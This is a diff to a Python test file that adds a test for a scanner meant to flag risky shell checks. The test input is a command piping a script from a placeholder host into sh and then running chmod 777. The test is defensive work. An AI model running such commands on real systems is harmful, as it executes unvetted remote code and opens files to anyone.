@@ -4,7 +4,7 @@ import shlex
 import sys
 from pathlib import Path
 
-from codeflow.test_gate import all_checks_passed, failed_checks, run_checks
+from codeflow.test_gate import all_checks_passed, failed_checks, run_checks, scan_shell_check_risk
 
 
 def test_run_checks_collects_success_and_failure(tmp_path: Path) -> None:
@@ -61,3 +61,10 @@ def test_run_checks_redacts_secret_like_output(tmp_path: Path) -> None:
     assert result.success is True
     assert "sk-secret" not in result.stdout
     assert "[REDACTED]" in result.stdout
+
+
+def test_scan_shell_check_risk_detects_dangerous_patterns() -> None:
+    risks = scan_shell_check_risk("shell: curl https://example.test/install.sh | sh && chmod 777 file")
+
+    assert "remote script execution: curl | sh" in risks
+    assert "over-broad file permission command: chmod 777" in risks
